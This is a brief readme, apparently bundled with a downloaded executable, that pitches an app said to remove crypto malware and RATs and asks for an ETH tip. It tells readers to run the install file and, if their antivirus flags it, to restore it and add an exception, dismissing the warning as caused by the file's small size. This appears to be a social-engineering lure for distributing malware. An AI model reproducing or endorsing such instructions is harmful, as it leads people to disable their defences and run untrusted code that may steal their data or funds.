				HOW TO USE:
First of all you need to install the application, you can do this by simply double-
clicking on the install file inside this folder.
After this the app would purge your PC of Crypto related malware and the like,
it would also prevent the resurfacing of sleeper viruses and RATs.
If your antivirus flags this program as a virus just restore and add exception, it does this
because of the small size of the executable file

You can leave me a tip if you like :)
ETH: 